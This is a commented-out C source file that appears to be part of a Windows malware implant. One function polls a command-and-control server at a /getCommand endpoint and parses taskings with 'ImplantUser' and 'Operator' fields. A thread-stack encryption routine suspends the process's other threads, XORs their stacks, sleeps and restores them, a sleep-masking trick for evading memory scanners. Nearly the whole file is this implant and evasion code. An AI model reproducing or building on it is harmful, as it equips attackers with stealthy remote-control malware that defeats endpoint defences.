// #include <windows.h>
// #include <stdio.h>
// #include <winternl.h>
// #include <intrin.h>
// #include <tlhelp32.h>
// #include <winhttp.h>

// #include "Typedefs.h"

// #pragma comment(lib, "ntdll.lib")

// #pragma comment(lib, "winhttp.lib")

// #define WIN32_LEAN_AND_MEAN

// void fetchCommand(Command* command) {
//     HINTERNET hSession, hConnect, hRequest;
//     DWORD dwSize, dwDownloaded;
//     char* jsonResponse = NULL;
//     DWORD bytesRead = 0;

//     // Open an internet session
//     hSession = WinHttpOpen(L"User Agent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
//     if (!hSession) {
//         printf("Error %u in WinHttpOpen.\n", GetLastError());
//         return;
//     }

//     // Establish a connection to the HTTP service
//     hConnect = WinHttpConnect(hSession, L"127.0.0.1", 8081, 0);
//     if (!hConnect) {
//         printf("Error %u in WinHttpConnect.\n", GetLastError());
//         WinHttpCloseHandle(hSession);
//         return;
//     }

//     // Open an HTTP request handle
//     hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/getCommand", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
//     if (!hRequest) {
//         printf("Error %u in WinHttpOpenRequest.\n", GetLastError());
//         WinHttpCloseHandle(hConnect);
//         WinHttpCloseHandle(hSession);
//         return;
//     }

//     // Send the request
//     if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
//         printf("Error %u in WinHttpSendRequest.\n", GetLastError());
//         return;
//     }

//     // Wait for the response.
//     if (!WinHttpReceiveResponse(hRequest, NULL)) {
//         printf("Error %u in WinHttpReceiveResponse.\n", GetLastError());
//         return;
//     }

//     do {
//         // Check for available data.
//         if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
//             printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
//             break;
//         }

//         if (dwSize == 0) {
//             break;  // No more data available
//         }

//         jsonResponse = (char*)realloc(jsonResponse, bytesRead + dwSize + 1);
//         if (!jsonResponse) {
//             printf("Memory allocation failed.\n");
//             break;
//         }

//         if (!WinHttpReadData(hRequest, (LPVOID)(jsonResponse + bytesRead), dwSize, &dwDownloaded)) {
//             printf("Error %u in WinHttpReadData.\n", GetLastError());
//             break;
//         }

//         bytesRead += dwDownloaded;
//         jsonResponse[bytesRead] = '\0';  // Null-terminate the response

//     } while (dwSize > 0);

//     if (jsonResponse) {
//          //printf("JSON Response: %s\n", jsonResponse);

//         // Parse the JSON response here (your existing code to handle command)
//         sscanf(jsonResponse,
//             "{\"Input\":\"%[^\"]\","
//             "\"Command\":\"%[^\"]\","
//             "\"ImplantUser\":\"%[^\"]\","
//             "\"Operator\":\"%[^\"]\","
//             "\"delay\":\"%[^\"]\","
//             "\"timeToExec\":\"%[^\"]\","
//             "\"File\":\"%[^\"]\","
//             "\"nullterm\":\"%[^\"]\"}",
//             command->Input,
//             command->Cmd,
//             command->ImplantUser,
//             command->Operator,
//             command->Delay,
//             command->TimeToExec,
//             command->File,
//             command->NullTerm);

//         free(jsonResponse);
//     }

//     // Close handles
//     WinHttpCloseHandle(hRequest);
//     WinHttpCloseHandle(hConnect);
//     WinHttpCloseHandle(hSession);
// }

// typedef NTSTATUS(NTAPI* NtQueryInformationThreadPtr)(
//     IN HANDLE ThreadHandle,
//     IN THREADINFOCLASS ThreadInformationClass,
//     OUT PVOID ThreadInformation,
//     IN ULONG ThreadInformationLength,
//     OUT PULONG ReturnLength OPTIONAL
//     );


// typedef struct _THREAD_BASIC_INFORMATION {
//     NTSTATUS                ExitStatus;
//     PVOID                   TebBaseAddress;
//     CLIENT_ID               ClientId;
//     KAFFINITY               AffinityMask;
//     KPRIORITY               Priority;
//     KPRIORITY               BasePriority;
// } THREAD_BASIC_INFORMATION, * PTHREAD_BASIC_INFORMATION;


// void xor_stack(void* stack_top, void* stack_base) {
//     unsigned char* top = (unsigned char*)stack_top;
//     unsigned char* base = (unsigned char*)stack_base;

//     for (unsigned char* p = top; p < base; ++p) {
//         *p ^= 0xAA;
//     }
// }

// DWORD WINAPI EncryptDecryptThread(LPVOID lpParam) {
//     DWORD currentThreadId = GetCurrentThreadId();
//     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
//     PVOID fetchCommandAddress = (PVOID)fetchCommand;

//     if (hSnapshot == INVALID_HANDLE_VALUE) {
//         printf("Failed to create snapshot. Error: %lu\n", GetLastError());
//         return 1;
//     }

//     THREADENTRY32 te32;
//     te32.dwSize = sizeof(THREADENTRY32);

//     if (Thread32First(hSnapshot, &te32)) {
//         do {
//             if (te32.th32OwnerProcessID == GetCurrentProcessId() && te32.th32ThreadID != currentThreadId) {
//                 HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);

//                 if (hThread != NULL) {
//                     SuspendThread(hThread);

//                     HMODULE ntdll = GetModuleHandleA("ntdll.dll");
//                     NtQueryInformationThreadPtr NtQueryInformationThread = (NtQueryInformationThreadPtr)GetProcAddress(ntdll, "NtQueryInformationThread");

//                     THREAD_BASIC_INFORMATION tbi;
//                     NTSTATUS status = NtQueryInformationThread(hThread, (THREADINFOCLASS)0, &tbi, sizeof(tbi), NULL);

//                     if (status == 0) {
//                         PVOID teb_base_address = tbi.TebBaseAddress;
//                         PNT_TIB tib = (PNT_TIB)malloc(sizeof(NT_TIB));
//                         SIZE_T bytesRead;

//                         if (ReadProcessMemory(GetCurrentProcess(), teb_base_address, tib, sizeof(NT_TIB), &bytesRead)) {
//                             PVOID stack_top = tib->StackLimit;
//                             PVOID stack_base = tib->StackBase;

//                             // Check if fetchCommand lies within the stack range
//                             if (fetchCommandAddress >= stack_top && fetchCommandAddress <= stack_base) {
//                                 // Adjust the range to exclude fetchCommand
//                                 stack_base = fetchCommandAddress;
//                             }

//                             xor_stack(stack_top, stack_base);
//                         }
//                         else {
//                             printf("ReadProcessMemory (TEB) failed. Error: %lu\n", GetLastError());
//                         }

//                         free(tib);
//                     }
//                     else {
//                         printf("NtQueryInformationThread failed with status: 0x%X\n", status);
//                     }
//                 }
//                 else {
//                     printf("Failed to open thread. Error: %lu\n", GetLastError());
//                 }
//             }
//         } while (Thread32Next(hSnapshot, &te32));
//     }
//     else {
//         printf("Thread32First failed. Error:%lu\n", GetLastError());
//     }

//     Sleep(3000); // Sleep for 3 seconds

//     // Decrypt the stacks and resume threads
//     if (Thread32First(hSnapshot, &te32)) {
//         do {
//             if (te32.th32OwnerProcessID == GetCurrentProcessId() && te32.th32ThreadID != currentThreadId) {
//                 HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
//                 if (hThread != NULL) {
//                     HMODULE ntdll = GetModuleHandleA("ntdll.dll");
//                     NtQueryInformationThreadPtr NtQueryInformationThread = (NtQueryInformationThreadPtr)GetProcAddress(ntdll, "NtQueryInformationThread");

//                     THREAD_BASIC_INFORMATION tbi;
//                     NTSTATUS status = NtQueryInformationThread(hThread, (THREADINFOCLASS)0, &tbi, sizeof(tbi), NULL);

//                     if (status == 0) {
//                         PVOID teb_base_address = tbi.TebBaseAddress;
//                         PNT_TIB tib = (PNT_TIB)malloc(sizeof(NT_TIB));
//                         SIZE_T bytesRead;

//                         if (ReadProcessMemory(GetCurrentProcess(), teb_base_address, tib, sizeof(NT_TIB), &bytesRead)) {
//                             PVOID stack_top = tib->StackLimit;
//                             PVOID stack_base = tib->StackBase;

//                             // Check if fetchCommand lies within the stack range
//                             if (fetchCommandAddress >= stack_top && fetchCommandAddress <= stack_base) {
//                                 // Adjust the range to exclude fetchCommand
//                                 stack_base = fetchCommandAddress;
//                             }

//                             xor_stack(stack_top, stack_base);
//                         }
//                         else {
//                             printf("ReadProcessMemory (TEB) failed. Error: %lu\n", GetLastError());
//                         }

//                         free(tib);
//                     }
//                     else {
//                         printf("NtQueryInformationThread failed with status: 0x%X\n", status);
//                     }

//                     ResumeThread(hThread);
//                     CloseHandle(hThread);
//                 }
//                 else {
//                     printf("Failed to open thread. Error: %lu\n", GetLastError());
//                 }
//             }
//         } while (Thread32Next(hSnapshot, &te32));
//     }
//     else {
//         printf("Thread32First failed. Error:%lu\n", GetLastError());
//     }

//     CloseHandle(hSnapshot);
//     return 0;
// }